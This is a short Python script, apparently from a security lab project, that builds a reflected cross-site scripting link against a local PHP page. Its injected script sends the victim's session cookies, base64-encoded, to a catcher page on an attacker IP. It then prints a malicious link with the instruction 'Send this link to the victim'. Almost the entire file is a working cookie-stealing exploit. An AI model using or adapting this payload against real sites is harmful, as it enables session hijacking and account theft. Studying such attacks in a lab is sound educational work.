import socket
import urllib.parse


def detect_lan_ip():
    # Open a UDP socket toward a public address. No packet is actually
    # sent (we never call sendto), but the OS picks the outbound
    # interface so getsockname() returns this machine's LAN IP.
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    except OSError:
        return None
    finally:
        s.close()


VULNERABLE_SITE_IP = "localhost"
TARGET_URL = f"http://{VULNERABLE_SITE_IP}/CyberProject/home.php"

ATTACKER_IP = detect_lan_ip() or input("Could not auto-detect LAN IP. Enter attacker IP: ").strip()

# The Payload: steal the cookie and base64-encode it before sending so it
# survives URL transport without breaking the query string.
# btoa - a function that encodes a string to Base64 to hide the cookies
js_payload = f"<script>document.location='http://{ATTACKER_IP}/CyberProject/AttackerServer/catcher.php?data=' + btoa(document.cookie);</script>"

# URL-encode the payload to escape special characters (e.g. &, =, ?) and ensure it survives URL transport
encoded_payload = urllib.parse.quote(js_payload)
malicious_link = f"{TARGET_URL}?msg={encoded_payload}"

print("=" * 60)
print(f"[!] XSS Payload Generated  (Target: {VULNERABLE_SITE_IP})")
print("=" * 60)
print(f"\nSend this link to the victim:\n\n{malicious_link}")

# After running this script, paste the printed link into a browser that is
# already logged in to the target site (http://localhost/CyberProject/home.php).
